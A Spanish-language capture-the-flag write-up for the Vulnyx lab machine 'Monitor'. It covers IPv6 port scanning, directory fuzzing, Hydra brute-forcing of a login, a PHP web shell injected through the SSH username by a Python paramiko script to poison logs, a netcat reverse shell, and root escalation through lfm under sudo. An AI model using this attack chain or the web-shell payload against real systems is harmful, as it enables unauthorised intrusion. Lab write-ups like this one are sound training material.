---
layout: post
title: Monitor - Vulnyx
---

# Writeup
![Raw]({{'/assets/img/Monitor/monitor.png' | relative_url}})

Vulnyx

----------------------------------------------------------------------------------------------

Iniciamos el escaneo con **Nmap** en busca de puertos expuestos y reconocer los sevicios que los ocupan, para posteriormente buscar vulnerabilidades.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.2.17 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 11:58 CEST
Initiating ARP Ping Scan at 11:58
Scanning 192.168.2.17 [1 port]
Completed ARP Ping Scan at 11:58, 0.14s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:58
Scanning 192.168.2.17 [65535 ports]
Discovered open port 80/tcp on 192.168.2.17
Completed SYN Stealth Scan at 11:58, 3.53s elapsed (65535 total ports)
Nmap scan report for 192.168.2.17
Host is up, received arp-response (0.0013s latency).
Scanned at 2024-04-14 11:58:20 CEST for 4s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:6E:27:04 (Oracle VirtualBox virtual NIC)
```
En esta ocasion solo es visible el puerto 80 con una pagina por default de apache, pero hay que fijarse bien, pues contiene informacion que sera util.
![apache-web]({{'/assets/img/Monitor/apache-web.png' | relative_url}})

Como por ipv4 solo tiene un puerto abierto, me decanto por hacer otro esacneo pero esta vez por ipv6.
```bash
❯ nmap -6 -p- -sS -T5 -vvv -n -Pn fe80::a00:27ff:fe6e:2704%wlo1 -oG ipv6Ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 12:03 CEST
Initiating ND Ping Scan at 12:03
Scanning fe80::a00:27ff:fe6e:2704 [1 port]
Completed ND Ping Scan at 12:03, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:03
Scanning fe80::a00:27ff:fe6e:2704 [65535 ports]
Discovered open port 80/tcp on fe80::a00:27ff:fe6e:2704
Discovered open port 22/tcp on fe80::a00:27ff:fe6e:2704
Completed SYN Stealth Scan at 12:03, 6.04s elapsed (65535 total ports)
Nmap scan report for fe80::a00:27ff:fe6e:2704
Host is up, received nd-response (0.0025s latency).
Scanned at 2024-04-14 12:03:31 CEST for 6s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:6E:27:04 (Oracle VirtualBox virtual NIC)
```
Aparece tambien el puerto 22, pero aun, nose ningun nombre de usuario y mucho menos contraseñas, pero el pagina de apache habia algo...un dominio.
```bash
❯ nmap -6 -sCV -p22,80 fe80::a00:27ff:fe6e:2704%wlo1 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 12:04 CEST
Nmap scan report for fe80::a00:27ff:fe6e:2704
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
MAC Address: 08:00:27:6E:27:04 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 08:00:27:6e:27:04
|_      manuf: Oracle VirtualBox virtual NIC
```
El dominio que aparece en la pagina de inicio de apache, lo introduzco en mi **/etc/hosts** y hago fuzzing de subdominios.
```bash
❯ gobuster dns -d monitoring.nyx -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     monitoring.nyx
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: event.monitoring.nyx

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```
Hay un ganador **event** añado este dominio tambien **event.monitoring.nyx** en mi **/etc/hosts** y contiene un error **403 Forbidden**
![Forbidden]({{'/assets/img/Monitor/forbidden.png' | relative_url}})

Sigo haciendo fuzzing y mas y mas...hasta que busco por directorios ocultos en el path.
```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://event.monitoring.nyx/.FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://event.monitoring.nyx/.FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                             
=====================================================================

000000259:   401        14 L     54 W       467 Ch      "admin"                                                                                                                                             
```
Me encuentra un direcctorio **.admin** que me pide **usuario:contraseña** que, obviamente no tengo.
![admin-panel]({{'/assets/img/Monitor/admin-login.png' | relative_url}})
Hago fuerza bruta con **hydra** asumiendo que el usuario es **admin** y me encuentre la contraseña correcta.
```bash
❯ hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt http-get://event.monitoring.nyx/.admin
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-14 12:23:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 815 login tries (l:1/p:815), ~51 tries per task
[DATA] attacking http-get://event.monitoring.nyx:80/.admin
[80][http-get] host: event.monitoring.nyx   login: admin   password: s****m
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-14 12:23:51
```
Obtengo lo mismo **403 Forbidden**
![admin-forbidden]({{'/assets/img/Monitor/admin-forbidden.png' | relative_url}})

Mas fuzzing en este nuevo direcctorio, con la variante de buscar por extensiones **php**
```bash
❯ wfuzz -c --hc=404,401 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --basic 'admin:s****m' "http://event.monitoring.nyx/.admin/FUZZ.php"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://event.monitoring.nyx/.admin/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                             
=====================================================================

000000628:   200        11 L     14 W       133 Ch      "event"                                                                                                                                             
```
Llego hasta este punto, donde solo veo **Event Monitor** sin mas ni mas...
![event-log]({{'/assets/img/Monitor/event-monitor.png' | relative_url}})

Pruebo y pruebo, como el puerto **22** estaba abierto por **ipv6** intento conectarme con usuario cualquiera
```bash
❯ ssh -6 aka@fe80::a00:27ff:fe6e:2704%enp3s0
aka@fe80::a00:27ff:fe6e:2704%enp3s0: Permission denied (publickey).
```
Bueno bueno bueno, veo que al parecer me esta mostrando los registros de conexiones **ssh** que puede acontecer un **Log Poisonig** 
![event-log]({{'/assets/img/Monitor/event-log-ssh.png' | relative_url}})
[RCE with LFI and SSH Log Poisoning](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

Despues de estar intentadolo un buen rato, hablando con D4t4s3c, creador de la maquina, vimos que, recientemente actualizaron **ssh** por parte del cliente donde se ha parcheado el enviar caracteres especiales en el campo de usuario, a la hora 
de hacer conexion por ssh. El comando **ssh -6 '<?php system($_GET["cmd"]); ?>'@\<ipv6\>** ya no funciona.

Tuve que hacer este script, que manda la carga sin problemas y se puede acontecer el **RCE** 

* Script en python3 peticion de cliente para **ssh** **'Log Poisoning - RCE'**

```python
#!/usr/bin/env python3
#encoding: utf-8
import paramiko
 
def client():
 
    host = 'fe80::a00:27ff:fe6e:2704%wlo1'
    username = '<?php system($_GET["cmd"]); ?>'
    password = '4ever'
    client = paramiko.SSHClient()
    try:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
    except paramiko.ssh_exception.BadAuthenticationType:
        pass
client()
```
Ejecuto el escript con **python3** no devuelve output ni nada, simplemente manda la peticion con la carga en el nombre de usuario.
![log-poisoning]({{'/assets/img/Monitor/www-data.png' | relative_url}})
Se puede ver que tengo ejecucion de comandos y que estoy como **www-data**
![log-poisoning]({{'/assets/img/Monitor/reverse-command.png' | relative_url}})
Hora de una reverse shell.
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.2.149] from (UNKNOWN) [192.168.2.17] 39196
whoami
www-data
```
En este punto aplico el tratamiento de **tty** para operar con una shell mas funcional.
```bash
www-data@monitor:/var/www/site/.admin$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
kevin:x:1000:1000:kevin:/home/kevin:/bin/bash
```
Identifico en el **passwd** los usuarios del sistema y solo veo a **kevin** y **root**.
```bash
www-data@monitor:/var/www/site/.admin$ grep -r --color "kevin" /etc 2>/dev/null
/etc/apache2/.htpasswd:#kevin:$u***************He
```
Dando vuelta un rato y divagando en cosas que no me llevan a nada, buso en el direcctorio **/etc** archivos que contengan el nombre de **kevin**, 
y hay un archivo con **usuario:contraseña**
```bash
www-data@monitor:/var/www/site/.admin$ su kevin
Password: 
kevin@monitor:/var/www/site/.admin$ whoami
kevin
kevin@monitor:/var/www/site/.admin$ cd
kevin@monitor:~$ cat user.txt 
995**************************184
```
Pruebo a cambiar de usuario con esa contraseña y consigo hacer pivoting de **www-data** a **kevin**, puedo ver la primera flag.
```bash
kevin@monitor:~$ sudo -l
Matching Defaults entries for kevin on monitor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kevin may run the following commands on monitor:
    (root) NOPASSWD: /usr/bin/lfm

kevin@monitor:~$ sudo /usr/bin/lfm
```
El comando **sudo -l** revela que puedo utilizar el administrador de archivos **lfm** con privilegio **sudo** y 
una mala gestion de permisos puede llevar una escala de privilegios no deseada.

* [LFM GitHub Informacion](https://github.com/langner/lfm) -> Administrador de archivos para linux

Ejecuto el programa...
* Se ve el gestor de archivos, con los direcctorios etc...

![log-poisoning]({{'/assets/img/Monitor/lfm.png' | relative_url}})
* Al pulsar la tecla **h** entra al menu y bajando a la ultima opcion **key bindings**

![log-poisoning]({{'/assets/img/Monitor/lfm-help.png' | relative_url}})
* Entro en esta guia, donde puedo abusar del modo paginate y ejecutar una **/bin/bash** 

![log-poisoning]({{'/assets/img/Monitor/exploit.png' | relative_url}})
![log-poisoning]({{'/assets/img/Monitor/bin-bash.png' | relative_url}})

Obtengo una shell como root y ya he podido escalar privilegios y ver la ultima flag.
```bash
root@monitor:/home/kevin# whoami
root
root@monitor:/home/kevin# cat /root/root.txt
2b5**************************f3d
```

Espro que te pueda servir de ayuda. GRACIAS por venir.
